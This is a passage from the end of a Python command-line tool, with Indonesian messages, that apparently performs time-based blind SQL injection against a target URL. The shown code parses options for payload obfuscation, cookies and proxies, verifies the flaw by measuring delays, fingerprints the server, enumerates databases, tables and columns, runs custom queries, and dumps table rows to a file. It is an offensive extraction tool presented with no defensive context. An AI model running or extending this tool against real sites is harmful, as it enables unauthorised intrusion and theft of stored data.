    ac.add_argument("--fingerprint",  action="store_true",
                    help="Ambil info server (version, user, host, dir)")
    ac.add_argument("--enum-db",      action="store_true", dest="enum_db",
                    help="Enumerasi semua database")
    ac.add_argument("--enum-tables",  action="store_true", dest="enum_tables",
                    help="Enumerasi tabel dalam --db")
    ac.add_argument("--enum-columns", action="store_true", dest="enum_columns",
                    help="Enumerasi kolom dalam --db --table")
    ac.add_argument("--dump",         action="store_true",
                    help="Dump data tabel")
    ac.add_argument("--query",        default="", help="Ekstrak hasil custom SQL query")
    ac.add_argument("--db",           default="", help="Nama database target")
    ac.add_argument("--table",        default="", help="Nama tabel target")
    ac.add_argument("--columns",      default="", help="Kolom untuk dump (pisah koma)")
    ac.add_argument("--dump-limit",   type=int, default=50, dest="dump_limit",
                    help="Maks baris yang di-dump (default: 50)")

    # Output
    o = p.add_argument_group("Output")
    o.add_argument("-o", "--output", default=None, help="File output")
    o.add_argument("--fmt",          default="txt", choices=["txt","json","csv"],
                   help="Format output (default: txt)")

    return p


# ─────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────

def main():
    print(BANNER)
    parser = build_parser()
    args = parser.parse_args()

    # Build multipart_fields
    fields: Dict[str, Any] = parse_kv(args.fields)
    if args.json_body:
        try:
            fields = json.loads(args.json_body)
        except json.JSONDecodeError:
            print("[!] --json-body bukan JSON valid")
            sys.exit(1)

    file_fields = [f.strip() for f in args.file_fields.split(",") if f.strip()]

    cfg = Config(
        url=args.url,
        inject_param=args.param,
        inject_type=args.type,
        multipart_fields=fields,
        file_fields=file_fields,
        cookies=parse_cookies(args.cookie),
        headers=default_headers(args.header),
        sleep_sec=args.sleep,
        threshold=args.threshold,
        retries=args.retries,
        timeout=args.timeout,
        max_len=args.max_len,
        threads=args.threads,
        dbms=args.dbms,
        obfuscation_level=args.obfuscate,
        payload_style=args.payload_style,
        output_file=args.output,
        output_fmt=args.fmt,
        proxy=args.proxy,
        verbose=args.verbose,
    )

    # Print config summary
    print(f"  Target     : {cfg.url}")
    print(f"  Param      : {cfg.inject_param}  [{cfg.inject_type}]")
    if cfg.cookies:
        print(f"  Cookies    : {', '.join(cfg.cookies.keys())}")
    if cfg.file_fields:
        print(f"  File fields: {', '.join(cfg.file_fields)}")
    print(f"  DBMS       : {cfg.dbms.upper()}")
    print(f"  Payload    : style={cfg.payload_style}  obfuscate={cfg.obfuscation_level}")
    print(f"  Timing     : sleep={cfg.sleep_sec}s  threshold={cfg.threshold}s  retries={cfg.retries}")
    if cfg.proxy:
        print(f"  Proxy      : {cfg.proxy}")
    print("═" * 60)

    engine   = InjectionEngine(cfg)
    extractor = DataExtractor(engine)
    enumerator = Enumerator(extractor)
    reporter  = Reporter(args.output, args.fmt)

    # ── Calibrate
    if args.calibrate:
        engine.calibrate()

    # ── Auto-detect
    if args.auto_detect:
        print("\n[*] Auto-detecting payload style...\n")
        found = engine.auto_detect()
        if not found:
            print("\n[!] Semua probe gagal. Coba naikkan --sleep atau periksa koneksi.")
            sys.exit(1)
        print(f"\n[+] Payload style {cfg.payload_style} berhasil.")
    else:
        # ── Verify
        print("\n[*] Verifikasi kerentanan...")
        if engine.verify():
            print(f"  [+] VULNERABLE — delay {cfg.sleep_sec}s terdeteksi (style={cfg.payload_style})")
        else:
            print("  [-] Tidak ada delay terdeteksi.")
            print("      Saran: --auto-detect  atau  --payload-style 0..7  atau naikkan --sleep")
            if not any([args.fingerprint, args.enum_db, args.enum_tables,
                        args.enum_columns, args.dump, args.query]):
                sys.exit(1)
            ans = input("  Lanjutkan tetap? [y/N] ").strip().lower()
            if ans != "y":
                sys.exit(0)

    if args.verify:
        sys.exit(0)

    # ── Fingerprint
    if args.fingerprint:
        info = enumerator.fingerprint()
        reporter.add("fingerprint", info)
        print("\n  ┌─ FINGERPRINT " + "─" * 44)
        for k, v in info.items():
            print(f"  │ {k:15} : {v}")
        print("  └" + "─" * 58)

    # ── Custom query
    if args.query:
        print(f"\n[*] Custom query: {args.query}")
        print("  Result: ", end="", flush=True)
        result = extractor.extract(args.query)
        print()
        reporter.add("custom_query", {"query": args.query, "result": result})

    # ── Enum databases
    if args.enum_db:
        dbs = enumerator.enum_databases()
        reporter.add("databases", dbs)
        print("\n  ┌─ DATABASES " + "─" * 46)
        for i, db in enumerate(dbs, 1):
            print(f"  │ [{i:02d}] {db}")
        print(f"  └─ Total: {len(dbs)}")

    # ── Enum tables
    if args.enum_tables:
        db = args.db
        if not db:
            print("\n[*] Mengambil database aktif untuk enum tables...")
            db = enumerator.get_current_db()
        tables = enumerator.enum_tables(db)
        reporter.add(f"tables_{db}", tables)
        print(f"\n  ┌─ TABLES in '{db}'" + "─" * 40)
        for i, tbl in enumerate(tables, 1):
            print(f"  │ [{i:02d}] {tbl}")
        print(f"  └─ Total: {len(tables)}")

    # ── Enum columns
    if args.enum_columns:
        db = args.db
        table = args.table
        if not table:
            print("[!] --enum-columns membutuhkan --table")
            sys.exit(1)
        if not db:
            db = enumerator.get_current_db()
        cols = enumerator.enum_columns(db, table)
        reporter.add(f"columns_{db}_{table}", cols)
        print(f"\n  ┌─ COLUMNS in '{db}.{table}'" + "─" * 32)
        for i, c in enumerate(cols, 1):
            print(f"  │ [{i:02d}] {c}")
        print(f"  └─ Total: {len(cols)}")

    # ── Dump
    if args.dump:
        db = args.db
        table = args.table
        if not table:
            print("[!] --dump membutuhkan --table")
            sys.exit(1)
        if not db:
            db = enumerator.get_current_db()
        columns = [c.strip() for c in args.columns.split(",") if c.strip()]
        if not columns:
            columns = enumerator.enum_columns(db, table)
        rows = enumerator.dump_table(db, table, columns, limit=args.dump_limit)
        reporter.add(f"dump_{db}_{table}", rows)

        if rows:
            col_w = 20
            header = " | ".join(f"{c[:col_w]:<{col_w}}" for c in columns)
            print(f"\n  ┌─ DUMP {db}.{table} " + "─" * 40)
            print("  │ " + header)
            print("  │ " + "─" * len(header))
            for row in rows:
                line = " | ".join(f"{str(row.get(c,''))[:col_w]:<{col_w}}" for c in columns)
                print("  │ " + line)
            print(f"  └─ {len(rows)} baris")

    reporter.save()
    print("\n[+] Selesai.\n")


if __name__ == "__main__":
    main()
